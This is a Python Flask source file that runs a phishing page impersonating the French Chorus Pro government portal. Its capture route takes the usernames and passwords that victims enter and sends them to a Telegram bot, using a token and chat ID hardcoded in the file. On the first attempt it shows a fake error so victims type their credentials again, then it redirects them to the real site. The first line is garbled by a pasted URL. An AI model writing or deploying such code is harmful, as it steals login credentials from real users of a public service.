from flask import Flask, request, redirect, render_template, session, flashhttps://github.com/elenaclairelaphonte-cloud/Aspiring/settings
import requests

app = Flask(__name__)
app.secret_key = "super_secret_key_change_moi_avec_une_vraie_longue_cle"

REDIRECT_URL = "https://portail.chorus-pro.gouv.fr/aife_csm/fr"

TOKEN = "5597048673:AAFLr8KyvvrX0ww8vyAjhnTPWYO0YDGha9g"
CHAT_ID = 951613248


def send_to_telegram(message: str):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        resp = requests.post(url, json=payload, timeout=10)
        print("Telegram status:", resp.status_code)
    except Exception as e:
        print("Erreur Telegram:", e)


@app.route("/")
def index():
    # Quand on revient au portail, on peut réinitialiser le cycle
    session["login_attempts"] = 0
    return render_template("index.html")


@app.route("/login", methods=["GET"])
def login():
    # Si le compteur n'existe pas encore, on le met à 0
    if "login_attempts" not in session:
        session["login_attempts"] = 0
    print("DEBUG: Page login chargée - attempts =", session["login_attempts"])
    return render_template("login.html")


@app.route("/capture", methods=["POST"])
def capture():
    username = request.form.get("username")
    password = request.form.get("password")

    attempts = session.get("login_attempts", 0)
    print(f"DEBUG: Tentative reçue - attempts actuel = {attempts}")

    if not username or not password:
        flash("Veuillez remplir tous les champs.", "error")
        return redirect("/login")

    # Envoi Telegram
    message = (
        f"<b>🔐 Test Chorus Pro</b>\n"
        f"Tentative: {attempts + 1}\n"
        f"Identifiant: <code>{username}</code>\n"
        f"Mot de passe: <code>{password}</code>"
    )
    send_to_telegram(message)

    if attempts == 0:
        # PREMIÈRE TENTATIVE → message d'erreur
        print("DEBUG: Première tentative → Erreur")
        session["login_attempts"] = 1
        flash("Mot de passe incorrect. Veuillez réessayer.", "error")
        return redirect("/login")
    else:
        # DEUXIÈME TENTATIVE → redirection et reset du cycle
        print("DEBUG: Deuxième tentative → Redirection")
        session["login_attempts"] = 0  # on remet à 0 pour recommencer à la prochaine fois
        return redirect(REDIRECT_URL)


if __name__ == "__main__":
    app.run(debug=True)
